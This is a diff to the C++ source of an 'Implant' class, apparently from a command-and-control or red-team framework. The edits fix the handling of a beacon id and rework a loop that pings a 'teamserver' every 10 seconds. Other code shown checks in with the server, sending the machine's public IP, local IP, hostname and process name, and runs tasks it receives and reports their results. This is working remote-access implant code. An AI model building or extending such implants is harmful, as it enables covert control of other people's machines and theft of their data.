@@ -24,7 +24,7 @@
 
 
 using json = nlohmann::json;
-std::string ids;
+extern std::string ids;
 
 // Method to enable/disable the running status on our implant
 void Implant::setRunning(bool isRunningIn) { isRunning = isRunningIn; }
@@ -203,6 +203,7 @@ void Implant::beaconCheckIn(const char* url) {
     std::string nameProcess = GetProcessName();
 
     // Adding our results to the root ptree for json format
+    resultsLocal.put("beacon_id", ids);
     resultsLocal.put("Public IP", PublicIP);
     resultsLocal.put("IP", machineIP);
     resultsLocal.put("Hostname", hostname);
@@ -273,12 +274,12 @@ void Implant::serviceTasks() {
         // Range based for-loop to call the run() method on each task and add the results of tasks
         for (const auto& task : localTasks) {
             // Call run() on each task and we'll get back values for id, contents and success
-            const auto [id, contents, success] = std::visit([](const auto& task) {return task.run(); }, task);
+            const auto [id2, contents, success] = std::visit([](const auto& task) {return task.run(); }, task);
             // Scoped lock to add task results
             {
                 std::scoped_lock<std::mutex> resultsLock{ resultsMutex };
-                results.add(id + ".contents", contents);
-                results.add(id + ".success", success);
+                results.add(id2 + ".contents", contents);
+                results.add(id2 + ".success", success);
             }
         }
         // Go to sleep
@@ -288,20 +289,26 @@ void Implant::serviceTasks() {
 
 // Method to ping teamserver every 10 seconds
 void Implant::Pinger() {
-    // Local results variable and root for our ptree
-    boost::property_tree::ptree resultsLocal;
-    // Our results string that we will send to the server
-    std::stringstream resultsStringStream;
-
-    // Adding our results to the root ptree for json format
-    //resultsLocal.put("beacon_id", beacon_ID); requires fix
-    resultsLocal.put("alive", "TRUE");
-    // Parsing to json format
-    boost::property_tree::write_json(resultsStringStream, resultsLocal);
-
     while (isRunning) { //While loop for ping every 10 seconds
-        std::this_thread::sleep_for(std::chrono::seconds{ 10 });
-        if (sendHttpRequest(host, port, "/ping", resultsStringStream.str()) == "0") { setRunning(false); };
+        if (ids != "") {
+            // Local results variable and root for our ptree
+            boost::property_tree::ptree resultsLocal;
+            // Our results string that we will send to the server
+            std::stringstream resultsStringStream;
+
+            // Adding our results to the root ptree for json format
+            resultsLocal.put("beacon_id", ids); //requires fix
+            resultsLocal.put("alive", "TRUE");
+            // Parsing to json format
+            boost::property_tree::write_json(resultsStringStream, resultsLocal);
+
+
+            std::this_thread::sleep_for(std::chrono::seconds{ 10 });
+            if (sendHttpRequest(host, port, "/ping", resultsStringStream.str()) == "0") { setRunning(false); };
+        }
+        else {
+            std::this_thread::sleep_for(std::chrono::seconds{ 10 });
+        }
     }
 }
 
